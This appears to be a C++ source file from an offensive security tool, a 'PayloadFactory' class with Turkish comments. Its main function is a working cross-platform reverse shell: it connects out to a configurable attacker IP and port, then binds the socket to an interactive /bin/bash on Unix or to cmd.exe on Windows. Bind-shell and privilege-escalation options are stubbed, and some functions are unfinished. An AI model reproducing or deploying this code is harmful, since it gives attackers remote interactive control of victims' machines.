#include "../../include/payloadFactory.hpp"

/*
    1-manuel baslatma   //tcp ~ ipv4
    2-otomatik baslatma //tcp/udp ~ ipv4/ipv6 ~ port ~ ip
*/

PayloadFactory::PayloadFactory(TEM_TARGET_OS targetSystem){
    this->targetSystem = targetSystem;
    this->init_ipv4v6 = IPV4;
    this->init_tcp_udp = TCP;
    this->victim = new csock(init_tcp_udp,init_ipv4v6);
}


PayloadFactory::PayloadFactory(TEM_TARGET_OS targetSystem,CSOCK_INIT init_ipv4v6,CSOCK_INIT init_tcp_udp,
                               const std::string rsIP , uint rsPortNo)
: rsPortNo(rsPortNo) , rsIP(rsIP){
    this->targetSystem = targetSystem;
    this->init_ipv4v6 = init_ipv4v6;
    this->init_tcp_udp = init_tcp_udp;

    //manuel init 
    this->victim = new csock(init_tcp_udp,init_ipv4v6);
}

PayloadFactory::~PayloadFactory(){
    delete victim;
}


//reverse shell initalizer
bool PayloadFactory::temReverseShell(){
    victim->setConnectedServerConfig(rsIP.c_str(),rsPortNo);
    victim->setClientConnection(CSOCK_STAY);
    bool connectionStatus = victim->connectServer();

    if(!connectionStatus)
        return false;
    
    DEBUG(444);

    #ifdef TEM_HOST_IS_UNIX
        const char *shellPath = "/bin/bash";
        char *const argv[] = {"/bin/bash","-i",NULL}; //bash=argc1 , params -i terminal_mode ,null delimeter
        char *const envp[] = {NULL};

        short i = 0;  //read ,write ,write
        while(i < 3)  //stdin,stdout,stderr 
            dup2(victim->getSocketFD(),i++); //redirect socket , global sockets
        

        execve(shellPath,argv,envp); //replace eder processi
        
        perror("PROCESS NOT REPLACED !");
        return false;
        /*
        Replace the current process, executing PATH with arguments ARGV and
        environment ENVP. ARGV and ENVP are terminated by NULL pointers.
        File: unistd.h
        */   
    
    return true;
    #endif //TEM_HOST_IS_UNIX


    #ifdef TEM_HOST_IS_WIN32
    


        PROCESS_INFORMATION processConfig;                          //process baslatirken config yapmak icin struct
        STARTUPINFO startupConfig;                                  //processin x,y , xsize , ysize ... configi
        memset(&startupConfig,0,sizeof(startupConfig));
        
        startupConfig.cb = sizeof(startupConfig);                   //count of bytes erisimleri memory safe hale getirme
        startupConfig.dwFlags = STARTF_USESTDHANDLES;               //The hStdInput, hStdOutput, and hStdError members contain additional information
        startupConfig.hStdInput = startupConfig.hStdOutput = startupConfig.hStdError = (HANDLE) victim->getSocketFD();
        DEBUG(555);

        if (!CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupConfig, &processConfig)) {
            std::cerr << "CreateProcess failed! Error: " << GetLastError() << std::endl;
            return false;
        }
        


        /* msdn kaynak : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
        typedef struct _PROCESS_INFORMATION {
            HANDLE hProcess;
            HANDLE hThread;
            DWORD  dwProcessId;
            DWORD  dwThreadId;
        } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
        */

        /* msdn kaynak : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
        typedef struct _STARTUPINFOA {
            DWORD  cb;                                                      -------------> count of bytes
            LPSTR  lpReserved;
            LPSTR  lpDesktop;
            LPSTR  lpTitle;
            DWORD  dwX;
            DWORD  dwY;
            DWORD  dwXSize;
            DWORD  dwYSize;
            DWORD  dwXCountChars;
            DWORD  dwYCountChars;
            DWORD  dwFillAttribute;
            DWORD  dwFlags;                                                 -------------> double word flags
            WORD   wShowWindow;
            WORD   cbReserved2;
            LPBYTE lpReserved2;
            HANDLE hStdInput;
            HANDLE hStdOutput;
            HANDLE hStdError;
        } STARTUPINFOA, *LPSTARTUPINFOA;
        
        */

       /* WIN32 API SOYUTLAMALAR
        typedef unsigned long DWORD
        HANDLE -> PHANDLE -> void*
       
       */

    return true;
    #endif //TEM_HOST_IS_WIN32
}

void PayloadFactory::setIP_Port(const std::string &rsIP,uint rsPort){
    this->rsIP = rsIP;
    this->rsPortNo = rsPort;
}


bool PayloadFactory::createPayloadRuntime(const std::string payload_name ,std::vector<std::string> &args){
    if(payload_name == "reverse_shell"){
        DEBUG("1");
        return temReverseShell();
    }
    else if(payload_name == "bind_shell"){
        return false;
    }
    else if(payload_name == "privilege_escalation"){
        return false;
    }
    else{
        std::cout << "[PAYLOAD-FACTORY] : NOT DEFINED PAYLOAD" << "\n"; 
    }

    return false;
}

bool PayloadFactory::createPayloadExecutable(std::string &payload_name , std::vector<std::string> &args,std::string &outputPath){

}


bool PayloadFactorytemStartProcessWithSocket(){
    #ifdef TEM_HOST_IS_WIN32
        

    #endif 
}